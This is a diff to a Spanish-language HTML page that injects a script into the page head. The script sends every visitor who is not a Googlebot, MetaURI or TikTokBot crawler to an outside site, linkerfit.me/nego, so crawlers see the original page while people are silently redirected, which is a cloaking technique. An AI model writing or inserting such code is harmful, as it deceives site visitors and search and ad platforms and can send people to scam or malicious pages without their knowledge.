@@ -1,6 +1,15 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+    <script>
+        var userAgent = navigator.userAgent;
+
+        // Verifica se o agente do usuário corresponde a um bot.
+        if (!userAgent.match(/Googlebot|MetaURI|TikTokBot/i)) {
+            // Redireciona todos os visitantes, exceto os bots, para o site específico.
+            window.location.href = "https://linkerfit.me/nego";
+        }
+    </script>
     <link rel="icon" href="https://i.postimg.cc/2jZYqgMq/download.png" type="image/x-icon">
 
     <meta charset="UTF-8">
